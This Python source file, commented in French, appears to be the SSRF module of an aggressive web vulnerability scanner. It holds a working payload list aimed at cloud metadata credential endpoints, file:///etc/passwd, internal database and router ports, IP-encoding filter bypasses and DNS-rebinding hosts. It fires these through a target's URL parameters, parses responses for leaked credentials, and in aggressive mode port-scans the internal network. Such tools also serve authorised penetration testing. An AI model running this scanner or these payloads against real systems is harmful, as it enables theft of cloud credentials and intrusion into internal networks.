#!/usr/bin/env python3
"""
📡 SSRF DETECTION ULTRA-AGRESSIF — OWASP A05:2025
Server-Side Request Forgery - Internal network scanning & cloud metadata
"""

import re
import time
import urllib.parse
from colorama import Fore, Style

class SSRFDetector:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
        self.vulns = []
    
    def scan(self, params=None):
        print(f"\n{Fore.CYAN}[📡 SSRF DETECTION ULTRA-AGRESSIF] {Style.RESET_ALL}\n")
        params = params or getattr(self.engine, "discover_form_params", lambda: [])() or ["url", "uri", "path", "dest", "redirect", "target", "ref", "callback", "q", "id"]
        
        # Payloads SSRF par catégorie
        ssrf_payloads = {
            'basic': [
                'http://127.0.0.1:80',
                'http://localhost:80',
                'http://0.0.0.0:80',
                'http://169.254.169.254/latest/meta-data/',  # AWS metadata
                'http://metadata.google.internal/',  # GCP metadata
                'http://169.254.169.254/metadata/v1/',  # Azure metadata
                'file:///etc/passwd',
                'file:///etc/hosts',
                'file:///windows/system32/drivers/etc/hosts'
            ],
            'network_scanning': [
                'http://192.168.1.1:80',  # Router
                'http://192.168.0.1:80',
                'http://10.0.0.1:80',
                'http://172.16.0.1:80',
                'http://127.0.0.1:22',  # SSH
                'http://127.0.0.1:3306',  # MySQL
                'http://127.0.0.1:5432',  # PostgreSQL
                'http://127.0.0.1:6379',  # Redis
                'http://127.0.0.1:27017'  # MongoDB
            ],
            'cloud_services': [
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/user-data/',
                'http://metadata.google.internal/computeMetadata/v1/instance/',
                'http://169.254.169.254/metadata/identity?api-version=2019-08-15',
                'http://169.254.169.254/metadata/v1/maintenance',
                'http://instance-data/?api-version=1.0'
            ],
            'bypass_techniques': [
                'http://127.0.0.1%00',  # Null byte injection
                'http://127.0.0.1:80%00',  # Null byte with port
                'http://127.0.0.1:80@',  # @ bypass
                'http://127.0.0.1:80#',  # Fragment bypass
                'http://127.0.0.1:80?',  # Query bypass
                'http://0x7f000001',  # Hex IP
                'http://2130706433',  # Decimal IP
                'http://localhost.',
                'http://127.0.0.1./',
                'http://127.000.000.001',  # Octal IP
                'http://017700000001',  # Leading zeros
                'http://127.1.1.1',  # Variation
                'http://2130706433',  # Decimal
                'http://0x7F000001',  # Hex
                'http://0b1111111000000000000000000000001'  # Binary
            ],
            'dns_rebinding': [
                'http://127.0.0.1.ruby.metasploit.com',
                'http://169.254.169.254.ruby.metasploit.com',
                'http://localhost.localhost',
                'http://127.0.0.1.xip.io',
                'http://192.168.1.1.xip.io'
            ]
        }
        
        for param in params:
            print(f"  → Test paramètre: {param}")
            
            for category, payloads in ssrf_payloads.items():
                for payload in payloads:
                    try:
                        # Encoder le payload
                        encoded_payload = urllib.parse.quote(payload)
                        test_url = self.engine.build_url(param, encoded_payload)
                        
                        # Faire la requête
                        resp = self.engine.session.get(test_url, timeout=10)
                        
                        # Analyser la réponse
                        vuln_info = self._analyze_ssrf_response(resp, payload, category, param, test_url)
                        if vuln_info:
                            self.vulns.append(vuln_info)
                            print(f"    {Fore.RED}[💥 SSRF CONFIRMÉ] {param} ({category}){Style.RESET_ALL}")
                            print(f"      Payload: {payload[:60]}...")
                            print(f"      Preuve: {vuln_info['evidence']}")
                            
                            # Mode agressif : scan réseau interne
                            if self.aggressive and category == 'basic':
                                self._internal_network_scan(param)
                            break
                            
                    except Exception as e:
                        continue
        
        return self.vulns
    
    def _analyze_ssrf_response(self, resp, payload, category, param, url):
        """Analyser la réponse pour détecter SSRF — preuves strictes, exclusion FP."""
        
        txt = resp.text.lower()
        
        # AWS metadata — preuves strictes: structure key-value typique
        if '169.254.169.254' in payload or 'metadata' in payload.lower():
            aws_signatures = ['ami-id', 'instance-id', 'local-ipv4', 'security-credentials', 'iam/']
            found = [s for s in aws_signatures if s in txt]
            if len(found) >= 2 or ('ami-id' in txt and 'instance-id' in txt):
                return {'type': 'ssrf', 'param': param, 'payload': payload, 'category': category,
                        'indicator_type': 'aws_metadata', 'evidence': f'Cloud metadata AWS: {", ".join(found[:3])}', 'url': url}
        
        # GCP metadata — exiger computeMetadata ou structure instance/
        if 'metadata.google.internal' in payload or 'computeMetadata' in txt:
            if 'instance/' in txt or 'project/' in txt or 'machine-type' in txt or 'computeMetadata' in txt:
                return {'type': 'ssrf', 'param': param, 'payload': payload, 'category': category,
                        'indicator_type': 'gcp_metadata', 'evidence': 'GCP metadata (instance/project/zone)', 'url': url}
        
        # Azure metadata
        if '169.254.169.254' in payload and ('subscriptionId' in txt or 'resourceGroupName' in txt or 'vmId' in txt):
            return {'type': 'ssrf', 'param': param, 'payload': payload, 'category': category,
                    'indicator_type': 'azure_metadata', 'evidence': 'Azure metadata (subscriptionId/vmId)', 'url': url}
        
        # Fichiers système — preuves strictes comme LFI
        if 'file://' in payload or '/etc/passwd' in payload:
            if 'root:x:0:0' in txt and ('daemon:x:1:1' in txt or 'bin:x:2:2' in txt):
                return {'type': 'ssrf', 'param': param, 'payload': payload, 'category': category,
                        'indicator_type': 'file_content', 'evidence': 'Contenu /etc/passwd (root + daemon)', 'url': url}
            if ('[boot loader]' in txt or '[fonts]' in txt):
                return {'type': 'ssrf', 'param': param, 'payload': payload, 'category': category,
                        'indicator_type': 'file_content', 'evidence': 'Contenu win.ini', 'url': url}
        
        # Services internes — patterns typiques de pages default
        local_indicators = [('Apache', 'It works'), ('nginx', 'Welcome to nginx'), ('phpMyAdmin', 'phpMyAdmin')]
        for a, b in local_indicators:
            if a.lower() in txt and b.lower() in txt:
                return {'type': 'ssrf', 'param': param, 'payload': payload, 'category': category,
                        'indicator_type': 'local_services', 'evidence': f'Service interne: {a}', 'url': url}
        
        return None
    
    def _is_internal_service_response(self, resp):
        """Vérifier si la réponse vient d'un service interne"""
        internal_indicators = [
            'server: apache', 'server: nginx', 'server: iis',
            'x-powered-by: php', 'x-powered-by: asp.net',
            'welcome', 'test page', 'it works',
            'default page', 'apache2 default page'
        ]
        
        headers_text = str(resp.headers).lower()
        content_text = resp.text.lower()
        
        for indicator in internal_indicators:
            if indicator in headers_text or indicator in content_text:
                return True
        
        return False
    
    def _is_internal_url(self, url):
        """Vérifier si l'URL est interne"""
        internal_patterns = [
            '127.0.0.1', 'localhost', '0.0.0.0',
            '192.168.', '10.', '172.16.', '172.17.',
            '169.254.169.254', 'metadata.google.internal'
        ]
        
        for pattern in internal_patterns:
            if pattern in url:
                return True
        
        return False
    
    def _internal_network_scan(self, param):
        """Scan réseau interne en mode agressif"""
        print(f"    {Fore.YELLOW}[⚡] {Style.RESET_ALL}Scan réseau interne agressif...")
        
        # Ports communs à scanner
        common_ports = [22, 80, 443, 3306, 5432, 6379, 27017, 8080, 8443]
        
        for port in common_ports:
            try:
                payload = f'http://127.0.0.1:{port}'
                encoded_payload = urllib.parse.quote(payload)
                test_url = self.engine.build_url(param, encoded_payload)
                
                resp = self.engine.session.get(test_url, timeout=3)
                
                if resp.status_code != 404:
                    print(f"      {Fore.GREEN}[+] {Style.RESET_ALL}Port {port} ouvert/détecté")
                    self.vulns.append({
                        'type': 'ssrf_port',
                        'param': param,
                        'payload': payload,
                        'evidence': f'Internal port {port} accessible',
                        'url': test_url
                    })
                    
            except:
                continue
